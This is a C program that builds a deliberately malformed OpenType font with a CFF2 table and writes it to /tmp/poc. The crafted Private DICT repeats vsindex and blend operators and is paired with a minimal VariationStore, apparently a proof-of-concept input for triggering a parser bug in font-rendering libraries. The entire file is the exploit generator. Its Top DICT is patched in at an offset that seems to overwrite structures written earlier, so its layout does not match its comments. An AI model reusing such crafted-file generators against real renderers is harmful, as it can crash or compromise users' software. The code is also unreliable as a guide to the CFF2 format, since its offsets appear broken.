#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void w16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void w32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void push_int28(FILE *f, uint16_t v) {
    fputc(0x1C, f);
    w16(f, v);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) return 1;

    /* OpenType header */
    fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f);
    w16(f, 1); w16(f, 0); w16(f, 0); w16(f, 0);

    /* Table record for CFF2 */
    fputc('C', f); fputc('F', f); fputc('F', f); fputc('2', f);
    w32(f, 0);
    long off_pos = ftell(f);
    w32(f, 0); w32(f, 0);

    long cff2_start = ftell(f);

    /* CFF2 Header */
    fputc(0x02, f); fputc(0x00, f); fputc(0x05, f);
    long top_len_pos = ftell(f);
    w16(f, 0);

    /* Write all other structures first to compute offsets */
    /* Global Subr INDEX (empty) */
    long gsubr_start = ftell(f);
    w32(f, 0);
    long gsubr_end = ftell(f);

    /* FDArray INDEX */
    long fdarray_start = ftell(f);
    w32(f, 1);
    fputc(0x01, f);
    fputc(0x01, f);

    /* Private DICT data */
    long private_dict_start = ftell(f);
    fputc(0x8B, f); fputc(0x8B, f); fputc(0x8C, f);
    fputc(0x16, f); /* vsindex */
    fputc(0x17, f); /* blend */
    fputc(0x8B, f); fputc(0x8B, f); fputc(0x8C, f);
    fputc(0x16, f); /* vsindex */
    fputc(0x17, f); /* blend */
    long private_dict_end = ftell(f);
    uint32_t private_dict_size = (uint32_t)(private_dict_end - private_dict_start);
    uint32_t private_dict_offset = (uint32_t)(private_dict_start - cff2_start);

    /* Font DICT */
    push_int28(f, (uint16_t)private_dict_size);
    push_int28(f, (uint16_t)private_dict_offset);
    fputc(0x12, f);
    long font_dict_end = ftell(f);
    uint32_t font_dict_data_size = (uint32_t)(font_dict_end - (fdarray_start + 4 + 1 + 1 + 1));
    fseek(f, fdarray_start + 4 + 1 + 1, SEEK_SET);
    fputc((uint8_t)(1 + font_dict_data_size), f);
    fseek(f, font_dict_end, SEEK_SET);

    /* FDSelect */
    long fdselect_start = ftell(f);
    w16(f, 1);
    fputc(0x00, f);

    /* CharStrings INDEX */
    long charstrings_start = ftell(f);
    w32(f, 1);
    fputc(0x01, f);
    fputc(0x01, f);
    fputc(0x02, f);
    fputc(0x0E, f);

    /* VariationStore */
    long vstore_start = ftell(f);
    w16(f, 1);
    w32(f, 10);
    w16(f, 1);
    w32(f, 10 + 4 + 4 + 2 + 2 + 6);
    w16(f, 1);
    w16(f, 1);
    w16(f, 0); w16(f, 0x4000); w16(f, 0x4000);
    w16(f, 1);
    w16(f, 0);
    w16(f, 1);
    w16(f, 0);
    w16(f, 0);
    long vstore_end = ftell(f);

    /* Now write Top DICT with correct offsets */
    fseek(f, top_len_pos + 2, SEEK_SET); /* after topDictLength field */
    push_int28(f, (uint16_t)(vstore_start - cff2_start));
    fputc(0x18, f); /* VStore */
    push_int28(f, (uint16_t)(fdarray_start - cff2_start));
    fputc(0x0C, f); fputc(0x24, f); /* FDArray */
    push_int28(f, (uint16_t)(fdselect_start - cff2_start));
    fputc(0x0C, f); fputc(0x25, f); /* FDSelect */
    push_int28(f, (uint16_t)(charstrings_start - cff2_start));
    fputc(0x11, f); /* CharStrings */
    long top_dict_end = ftell(f);
    uint16_t top_dict_len = (uint16_t)(top_dict_end - (top_len_pos + 2));
    fseek(f, top_len_pos, SEEK_SET);
    w16(f, top_dict_len);
    fseek(f, top_dict_end, SEEK_SET);

    /* Patch OpenType table record */
    long cff2_end = ftell(f);
    uint32_t cff2_length = (uint32_t)(cff2_end - cff2_start);
    fseek(f, off_pos, SEEK_SET);
    w32(f, (uint32_t)cff2_start);
    w32(f, cff2_length);

    fclose(f);
    return 0;
}